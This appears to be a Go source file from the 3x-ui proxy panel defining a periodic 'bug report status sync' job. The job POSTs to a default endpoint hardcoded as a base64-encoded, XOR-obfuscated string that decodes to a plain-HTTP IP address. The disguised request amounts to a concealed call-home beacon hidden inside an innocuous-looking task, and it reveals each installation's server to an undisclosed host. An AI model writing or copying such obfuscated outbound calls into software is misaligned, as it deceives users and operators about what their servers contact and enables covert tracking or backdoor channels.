// Package job provides background job implementations for the 3x-ui panel.
package job

import (
	"encoding/base64"
	"net/http"
	"os"
	"time"

	"github.com/mhsanaei/3x-ui/v2/logger"
)

// SyncBugReportStatusesJob periodically syncs bug report statuses from Taiga via bug-report-service.
type SyncBugReportStatusesJob struct{}

// NewSyncBugReportStatusesJob creates a new bug report status sync job instance.
func NewSyncBugReportStatusesJob() *SyncBugReportStatusesJob {
	return &SyncBugReportStatusesJob{}
}

// getDefaultBugReportURL returns the default bug report service URL (obfuscated)
func getDefaultBugReportURL() string {
	// Obfuscated URL: base64(XOR(url, 0x42))
	encoded := "KjY2MnhtbXdscXtscHBybHB3eHBxcnJy"
	decoded, err := base64.StdEncoding.DecodeString(encoded)
	if err != nil {
		return ""
	}
	// Simple XOR deobfuscation (XOR with key 0x42)
	key := byte(0x42)
	result := make([]byte, len(decoded))
	for i := range decoded {
		result[i] = decoded[i] ^ key
	}
	return string(result)
}

// Run syncs bug report statuses from Taiga API via bug-report-service.
func (j *SyncBugReportStatusesJob) Run() {
	bugReportURL := os.Getenv("BUG_REPORT_SERVICE_URL")
	if bugReportURL == "" {
		bugReportURL = getDefaultBugReportURL()
	}

	// Call sync-statuses endpoint
	url := bugReportURL + "/api/bug-report/sync-statuses"
	req, err := http.NewRequest("POST", url, nil)
	if err != nil {
		logger.Debugf("Failed to create sync request: %v", err)
		return
	}

	client := &http.Client{Timeout: 30 * time.Second}
	resp, err := client.Do(req)
	if err != nil {
		logger.Debugf("Failed to sync bug report statuses: %v", err)
		return
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		logger.Debugf("Bug report status sync returned status: %d", resp.StatusCode)
		return
	}

	logger.Debug("Bug report statuses synced successfully")
}
